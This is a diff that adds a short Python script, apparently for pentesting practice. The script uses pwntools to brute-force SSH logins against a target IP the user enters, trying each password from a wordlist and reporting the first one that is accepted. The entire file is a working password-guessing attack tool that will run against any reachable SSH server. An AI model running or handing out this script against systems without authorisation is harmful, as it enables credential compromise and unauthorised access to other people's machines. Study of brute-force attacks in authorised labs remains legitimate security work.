@@ -1,0 +1,30 @@
+from pwn import *
+import time
+import os
+
+# Prompt user for target details
+host = input("Enter SSH target IP (e.g., 127.0.0.1): ")
+username = input("Enter SSH username: ")
+password_file = input("Enter path to password wordlist file (e.g., ssh-common-password.txt): ")
+
+# Check if file exists
+if not os.path.isfile(password_file):
+    print(f"[!] Wordlist file not found: {password_file}")
+    exit(1)
+
+# Open and process the wordlist
+with open(password_file, "r") as password_list:
+    attempts = 0
+    for password in password_list:
+        password = password.strip()
+        attempts += 1
+        print(f"[{attempts}] Attempting password: '{password}'...")
+        try:
+            session = ssh(host=host, user=username, password=password, timeout=0.5)
+            print(f"\n[✔] Valid password found: '{password}'")
+            session.close()
+            break
+        except Exception:
+            pass
+    else:
+        print("\n[✘] No valid password found in the list.")
